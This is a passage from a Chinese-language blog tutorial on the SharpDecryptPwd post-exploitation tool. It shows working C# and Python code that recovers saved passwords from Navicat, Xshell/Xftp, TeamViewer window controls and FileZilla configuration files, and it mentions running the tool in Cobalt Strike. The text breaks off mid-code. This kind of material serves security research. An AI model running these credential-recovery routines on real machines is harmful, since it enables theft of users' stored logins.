class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">EncryptString</span>(<span class="params"><span class="keyword">string</span> plaintext</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] plaintext_bytes = Encoding.UTF8.GetBytes(plaintext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">            blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> ret = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">int</span> blocks_len = plaintext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line">            <span class="keyword">int</span> left_len = plaintext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line">            <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">                Array.Copy(plaintext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">                XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">                blowfishCipher.Encrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">                XorBytes(CV, temp, Blowfish.BlockSize);</span><br><span class="line"></span><br><span class="line">                ret += ByteArrayToString(temp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">                blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">                XorBytes(CV,</span><br><span class="line">                         plaintext_bytes.Skip(blocks_len * Blowfish.BlockSize).Take(left_len).ToArray(),</span><br><span class="line">                         left_len);</span><br><span class="line">                ret += ByteArrayToString(CV.Take(left_len).ToArray());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-解密过程"><a href="#1-3-解密过程" class="headerlink" title="1.3 解密过程"></a>1.3 解密过程</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">DecryptString</span>(<span class="params"><span class="keyword">string</span> ciphertext</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ciphertext_bytes = StringToByteArray(ciphertext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">    blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] ret = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> blocks_len = ciphertext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">int</span> left_len = ciphertext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">byte</span>[] temp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">        Array.Copy(temp, temp2, Blowfish.BlockSize);</span><br><span class="line">        blowfishCipher.Decrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp).ToArray();</span><br><span class="line">        XorBytes(CV, temp2, Blowfish.BlockSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">        Array.Clear(temp, <span class="number">0</span>, temp.Length);</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * blocks_len, temp, <span class="number">0</span>, left_len);</span><br><span class="line">        blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Encoding.UTF8.GetString(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-27_12-48-37.png" alt=""></p><p><center> Navicat PremiumSoft 解密结果</center></p><h2 id="0x02-SSMS"><a href="#0x02-SSMS" class="headerlink" title="0x02 SSMS"></a>0x02 SSMS</h2><p>​以 <code>session</code> 文件名及位置来划分，SSMS 可以分为 3 个大版本。（保存的文件都是标准的.net二进制序列化文件）</p><table><tr><th width="20%" bgcolor="#eea236">Version </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">Session File Path</th></tr><tr><td> SSMS 2005 </td><td> %appdata%\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat</td></tr><tr><td> SSMS 2008 </td><td> %appdata%\Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin</td></tr><tr><td> SSMS Other </td><td> %appdata%\Microsoft\SQL Server Management Studio\xxxx\SqlStudio.bin</td></tr></table><p>这章节，所要表达的内容在 <a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a> 当中已经分析得很详细了，故不多写。</p><p><strong><em>PS：</em></strong>因为要加载私有程序集，故此程序无法在 <code>Cobalt Strike</code> 中使用，原因未知。</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_15-51-03.png" alt=""></p><p><center> SharpSSMSPwd 解密结果</center></p><h2 id="0x03-Xmanager"><a href="#0x03-Xmanager" class="headerlink" title="0x03 Xmanager"></a>0x03 Xmanager</h2><p>​        有人问 session 文件里保存的密码是以什么方式保存的，被盗了后果是否很严重？<br>官方给出了下面的答案</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-What <span class="keyword">is</span> the obfuscation algorithm?</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> <span class="keyword">not</span> obfuscating password. Xshell <span class="keyword">uses</span> RC4 <span class="keyword">with</span> SHA256.</span><br></pre></td></tr></table></figure><p>当然，这是 5.1 版本之后所使用的。</p><p>如今的 <code>Xmanager</code> 大致可分为 2 个大版本。版本名及产生的 <code>session</code> 文件位置如下：</p><table><tr><th width="20%" bgcolor="#eea236">产品 </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">会话文件位置</th></tr><tr><td> XShell 5 </td><td> %userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td> XFtp 5 </td><td> %userprofile%\Documents\NetSarang\Xftp\Sessions</td></tr><tr><td> XShell 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td> XFtp 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions</td></tr></table><p>以下以 <code>XShell 6</code> 为例</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-22_09-27-08.png" alt=""></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-22_09-28-25.png" alt=""></p><h3 id="3-1-如何加密"><a href="#3-1-如何加密" class="headerlink" title="3.1 如何加密"></a>3.1 如何加密</h3><p>​    版本的不同，其加密方式也不一样。以下为默认设置下的加密行为。</p><ul><li><p><strong>版本 &lt; 5.1</strong></p><p><code>Xshell</code> 采用以字符串<code>!X@s#h$e%l^l&amp;</code> 的 MD5 值作为作为 <code>RC4 加密算法</code>中的密钥，以下是加密实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = ba2d9b7e9cca73d152b26772662df55e</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#h$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># +amcdP4=</span></span><br></pre></td></tr></table></figure><p><code>Xftp</code> 同理，以 <code>!X@s#c$e%l^l&amp;</code> 的 MD5 值作为密钥，与 Xshell 所使用的字符串仅一个字符之分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = 306e9835de9291d227bb28b2f72dca33</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#c$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># SvmUuQg=</span></span><br></pre></td></tr></table></figure></li><li><p><strong>版本 = 5.1 or 5.2</strong></p><p><code>Xshell</code> 和 <code>Xftp</code> 都使用 <code>SHA-256 摘要算法</code>生成密钥，作为 <code>RC4 加密</code>中使用的密钥。</p><p>以当前<code>用户账户的 SID</code> 作为 SHA-256 摘要，长度为 32 个字节的数组。SID 可通过 <code>whoami /user</code> 进行获取，如下所示：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\RcoIl&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名         SID</span><br><span class="line">============== =============================================</span><br><span class="line">rcoil-pc\rcoil S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: a6a7f87e9ab607e8ec70446569ff86919a55417c9259b8e866afb1403fb17a27</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0xA6</span>, <span class="number">0xA7</span>, <span class="number">0xF8</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xB6</span>, <span class="number">0x07</span>, <span class="number">0xE8</span>, <span class="number">0xEC</span>, <span class="number">0x70</span>, <span class="number">0x44</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x69</span>, <span class="number">0xFF</span>, <span class="number">0x86</span>, <span class="number">0x91</span>, <span class="number">0x9A</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x7C</span>, <span class="number">0x92</span>, <span class="number">0x59</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0xAF</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0xB1</span>, <span class="number">0x7A</span>, <span class="number">0x27</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>版本 &gt; 5.2</strong></p><p>而 5.2 版本之后的 <code>Xshell</code> 与 <code>Xftp</code>，与之前只是多加了一个用户名。如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#user+sid</span></span><br><span class="line">RcoIlS<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: <span class="number">5e53</span>a13c5e98d02f8100ce62deb6e0dfec2a2361ba3c7fdd84dceb00554264bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0x53</span>, <span class="number">0xA1</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0x98</span>, <span class="number">0xD0</span>, <span class="number">0x2F</span>, <span class="number">0x81</span>, <span class="number">0x00</span>, <span class="number">0xCE</span>, <span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0xB6</span>, <span class="number">0xE0</span>, <span class="number">0xDF</span>, <span class="number">0xEC</span>, <span class="number">0x2A</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x3C</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>,</span><br><span class="line"><span class="number">0x84</span>, <span class="number">0xDC</span>, <span class="number">0xEB</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x42</span>, <span class="number">0x64</span>, <span class="number">0xBB</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>设置了  Master Key 的情况下（5.1 版本之后）</p><p>如果设置了 主密码，则以主密码的 <code>SHA-256摘要</code>作为 <code>RC4 加密</code>中使用的密钥。例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Master Key:yingyingying</span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0xF9</span>, <span class="number">0xB6</span>, <span class="number">0x86</span>, <span class="number">0xF8</span>, <span class="number">0xE1</span>, <span class="number">0xCE</span>, <span class="number">0x51</span>, <span class="number">0xCB</span>, <span class="number">0xCD</span>, <span class="number">0xCB</span>, <span class="number">0x2F</span>,</span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x2B</span>, <span class="number">0x33</span>, <span class="number">0xB4</span>, <span class="number">0x3B</span>, <span class="number">0x17</span>, <span class="number">0xF3</span>, <span class="number">0xE6</span>, <span class="number">0xE9</span>, <span class="number">0x40</span>, <span class="number">0x23</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x68</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0xEC</span>, <span class="number">0xD6</span>, <span class="number">0x59</span>, <span class="number">0xF5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-2-加密过程（C-）"><a href="#3-2-加密过程（C-）" class="headerlink" title="3.2 加密过程（C#）"></a>3.2 加密过程（C#）</h3><p>​        假设我们的密码是 <code>root</code>，则它的 <code>SHA-256 摘要</code>将作为附加加密数据。</p> <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x13</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x13</span>, <span class="number">0x7E</span>, <span class="number">0x16</span>, <span class="number">0x31</span>, <span class="number">0xBB</span>, <span class="number">0xA3</span>, <span class="number">0x01</span>, <span class="number">0xD5</span>,</span><br><span class="line"><span class="number">0xAC</span>, <span class="number">0xAB</span>, <span class="number">0x6E</span>, <span class="number">0x7B</span>, <span class="number">0xB7</span>, <span class="number">0xAA</span>, <span class="number">0x74</span>, <span class="number">0xCE</span>, <span class="number">0x11</span>, <span class="number">0x85</span>, <span class="number">0xD4</span>, <span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0xF5</span>, <span class="number">0x1D</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0xB2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"root"</span></span><br><span class="line">cipher = ARC4.new(SHA256.new(UserSid).digest())</span><br><span class="line">checksum = SHA256.new(rawPass).digest()</span><br><span class="line">ciphertext = cipher.encrypt(rawPass)</span><br><span class="line"><span class="keyword">print</span> b64encode(ciphertext + checksum).decode()</span><br><span class="line"></span><br><span class="line">==》 klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-解密过程（C-）"><a href="#3-3-解密过程（C-）" class="headerlink" title="3.3 解密过程（C#）"></a>3.3 解密过程（C#）</h3><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span></span><br><span class="line">data = b64decode(rawPass)</span><br><span class="line">Cipher = ARC4.new(SHA256.new((UserSid).encode()).digest())</span><br><span class="line">ciphertext, checksum = data[:-SHA256.digest_size], data[-SHA256.digest_size:]</span><br><span class="line">plaintext = Cipher.decrypt(ciphertext)</span><br><span class="line"><span class="keyword">print</span> plaintext.decode()</span><br></pre></td></tr></table></figure></li><li><p><strong><em>C# 版本</em></strong></p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span>;</span><br><span class="line"><span class="keyword">string</span> rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] data = Convert.FromBase64String(rawPass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = <span class="keyword">new</span> SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] passData = <span class="keyword">new</span> <span class="keyword">byte</span>[data.Length - <span class="number">0x20</span>];</span><br><span class="line">Array.Copy(data, <span class="number">0</span>, passData, <span class="number">0</span>, data.Length - <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">byte</span>[] decrypted = RC4Crypt.Decrypt(Key, passData);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">"Decrypt: &#123;0&#125;"</span>, Encoding.ASCII.GetString(decrypted));</span><br><span class="line"></span><br><span class="line"> ==》 Decrypt: root</span><br></pre></td></tr></table></figure></li></ul><p><strong>结果如下所示：</strong></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_09-32-36.png" alt=""></p><p>以上所有测试均为工作组环境，因为在域环境解密失败，原因未知。</p><h2 id="0x04-TeamView"><a href="#0x04-TeamView" class="headerlink" title="0x04 TeamView"></a>0x04 TeamView</h2><p>直接是通过获取 <code>TeamView</code> 的句柄，把窗体上所有控件的变量给读出来。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">EnumFunc</span>(<span class="params">IntPtr hWnd, IntPtr lParam</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> WM_GETTEXT = <span class="number">0x0D</span>;</span><br><span class="line">    GetClassNameW(hWnd, sb, sb.Capacity);</span><br><span class="line">    <span class="keyword">if</span> (sb.ToString() == <span class="string">"Edit"</span> || sb.ToString() == <span class="string">"Static"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WindowInfo wnd = <span class="keyword">new</span> WindowInfo();</span><br><span class="line">        wnd.hWnd = hWnd;</span><br><span class="line">        wnd.szClassName = sb.ToString();</span><br><span class="line">        <span class="keyword">if</span> (wnd.szClassName == <span class="string">"Edit"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">            SendMessage(hWnd, WM_GETTEXT, <span class="number">256</span>, stringBuilder);</span><br><span class="line">            wnd.szWindowName = stringBuilder.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            GetWindowTextW(hWnd, sb, sb.Capacity);</span><br><span class="line">            wnd.szWindowName = sb.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Console.WriteLine("句柄=" + wnd.hWnd.ToString().PadRight(20) + " 类型=" + wnd.szClassName.PadRight(20) + " 名称=" + wnd.szWindowName);</span></span><br><span class="line">        <span class="comment">//add it into list</span></span><br><span class="line">        wndList.Add(wnd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了其兼容性，不对结果进行筛选，输出全部窗体内容信息</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_14-40-13.png" alt=""></p><h2 id="0x05-FileZilla"><a href="#0x05-FileZilla" class="headerlink" title="0x05 FileZilla"></a>0x05 FileZilla</h2><p>从网上收集的信息得到：</p><ul><li><p>在 <code>Filezilla 2.X</code> 版本中，密码正在进行异或处理并存储在 Registry 中;</p></li><li><p>在 <code>Filezilla 3.x</code> 版本中，密码以明文形式存储在 <code>.xml文件</code>中。</p><p>  如今官方的最新版本为 <code>FileZilla_3.44.2_win64_sponsored-setup</code>，以此版本进行测试：</p><p>  <img src="/image/【编程】SharpDecryptPwd/blog_2019-08-26_09-47-20.png" alt=""></p></li></ul><p>​        直接读取 相关xml 的内容即可（<strong><em>recentservers.xml</em></strong>）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fileZilla</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), <span class="string">@"FileZilla\recentservers.xml"</span>);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (File.Exists(FzPath))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> objXmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">                        objXmlDocument.Load(FzPath);</span><br><span class="line">                        Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, <span class="string">"Host"</span>, <span class="string">"Port"</span>, <span class="string">"Username"</span>, <span class="string">"ratPass"</span>);</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="function">XmlElement XE <span class="title">in</span> (<span class="params">(XmlElement</span>)objXmlDocument.<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"RecentServers"</span></span>)[0]).<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"Server"</span></span>))</span></span><br><span class="line"><span class="function"></span>                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> Host = XE.GetElementsByTagName(<span class="string">"Host"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> Port = XE.GetElementsByTagName(<span class="string">"Port"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> User = XE.GetElementsByTagName(<span class="string">"User"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> Pass = 